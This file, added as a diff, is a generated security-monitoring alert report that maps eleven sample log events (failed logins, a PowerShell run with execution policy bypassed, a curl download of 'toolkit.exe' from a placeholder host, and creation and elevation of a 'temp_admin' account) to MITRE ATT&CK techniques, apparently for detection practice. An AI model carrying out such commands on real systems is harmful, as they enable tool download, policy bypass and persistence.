@@ -1,0 +1,128 @@
+Security Log Monitoring Alert Report
+============================================
+
+Total Alerts Generated: 11
+Report Generated: 2026-04-26 01:17:18
+
+Alert #1
+--------------------
+Rule: FAILED_LOGIN
+Severity: Medium
+Username: jsmith
+Source IP: 192.168.1.15
+MITRE ATT&CK: T1110 - Brute Force
+Tactic: Credential Access
+Description: Repeated or suspicious failed authentication attempts may indicate password guessing or credential attacks.
+Original Log: 2026-04-20 08:12:44 AUTH Failed login for user jsmith from 192.168.1.15
+
+Alert #2
+--------------------
+Rule: FAILED_LOGIN
+Severity: Medium
+Username: jsmith
+Source IP: 192.168.1.15
+MITRE ATT&CK: T1110 - Brute Force
+Tactic: Credential Access
+Description: Repeated or suspicious failed authentication attempts may indicate password guessing or credential attacks.
+Original Log: 2026-04-20 08:13:02 AUTH Failed login for user jsmith from 192.168.1.15
+
+Alert #3
+--------------------
+Rule: FAILED_LOGIN
+Severity: Medium
+Username: jsmith
+Source IP: 192.168.1.15
+MITRE ATT&CK: T1110 - Brute Force
+Tactic: Credential Access
+Description: Repeated or suspicious failed authentication attempts may indicate password guessing or credential attacks.
+Original Log: 2026-04-20 08:13:31 AUTH Failed login for user jsmith from 192.168.1.15
+
+Alert #4
+--------------------
+Rule: POWERSHELL_EXECUTION
+Severity: High
+Username: unknown
+Source IP: unknown
+MITRE ATT&CK: T1059.001 - PowerShell
+Tactic: Execution
+Description: PowerShell can be used by attackers to execute commands, download tools, or run scripts during an intrusion.
+Original Log: 2026-04-20 09:02:18 PROC powershell.exe -ExecutionPolicy Bypass -File update.ps1
+
+Alert #5
+--------------------
+Rule: SUSPICIOUS_DOWNLOAD
+Severity: Medium
+Username: unknown
+Source IP: unknown
+MITRE ATT&CK: T1105 - Ingress Tool Transfer
+Tactic: Command and Control
+Description: Suspicious downloads may indicate an attacker transferring tools or payloads into an environment.
+Original Log: 2026-04-20 09:02:18 PROC powershell.exe -ExecutionPolicy Bypass -File update.ps1
+
+Alert #6
+--------------------
+Rule: NEW_USER_CREATED
+Severity: High
+Username: created
+Source IP: unknown
+MITRE ATT&CK: T1136 - Create Account
+Tactic: Persistence
+Description: Unexpected account creation may indicate an attacker attempting to maintain access to a system.
+Original Log: 2026-04-20 09:15:33 ACCT New user created: temp_admin by administrator
+
+Alert #7
+--------------------
+Rule: SUSPICIOUS_DOWNLOAD
+Severity: Medium
+Username: unknown
+Source IP: unknown
+MITRE ATT&CK: T1105 - Ingress Tool Transfer
+Tactic: Command and Control
+Description: Suspicious downloads may indicate an attacker transferring tools or payloads into an environment.
+Original Log: 2026-04-20 09:18:42 WEB curl http://example-download-site.local/toolkit.exe -o toolkit.exe
+
+Alert #8
+--------------------
+Rule: PRIVILEGE_CHANGE
+Severity: High
+Username: temp_admin
+Source IP: unknown
+MITRE ATT&CK: T1098 - Account Manipulation
+Tactic: Persistence
+Description: Privilege or group membership changes may indicate an attempt to strengthen access or maintain persistence.
+Original Log: 2026-04-20 09:21:10 ACCT User temp_admin added to Administrators group
+
+Alert #9
+--------------------
+Rule: FAILED_LOGIN
+Severity: Medium
+Username: mroberts
+Source IP: 10.0.0.44
+MITRE ATT&CK: T1110 - Brute Force
+Tactic: Credential Access
+Description: Repeated or suspicious failed authentication attempts may indicate password guessing or credential attacks.
+Original Log: 2026-04-20 10:22:47 AUTH Failed login for user mroberts from 10.0.0.44
+
+Alert #10
+--------------------
+Rule: FAILED_LOGIN
+Severity: Medium
+Username: mroberts
+Source IP: 10.0.0.44
+MITRE ATT&CK: T1110 - Brute Force
+Tactic: Credential Access
+Description: Repeated or suspicious failed authentication attempts may indicate password guessing or credential attacks.
+Original Log: 2026-04-20 10:23:01 AUTH Failed login for user mroberts from 10.0.0.44
+
+Alert #11
+--------------------
+Rule: MULTIPLE_FAILED_LOGINS
+Severity: High
+Username: jsmith
+Source IP: 192.168.1.15
+MITRE ATT&CK: T1110 - Brute Force
+Tactic: Credential Access
+Description: Multiple failed login attempts from the same source or against the same user may indicate an active brute force attempt.
+Failed Login Count: 3
+Original Log: Multiple failed logins detected for user jsmith from 192.168.1.15. Count: 3
+
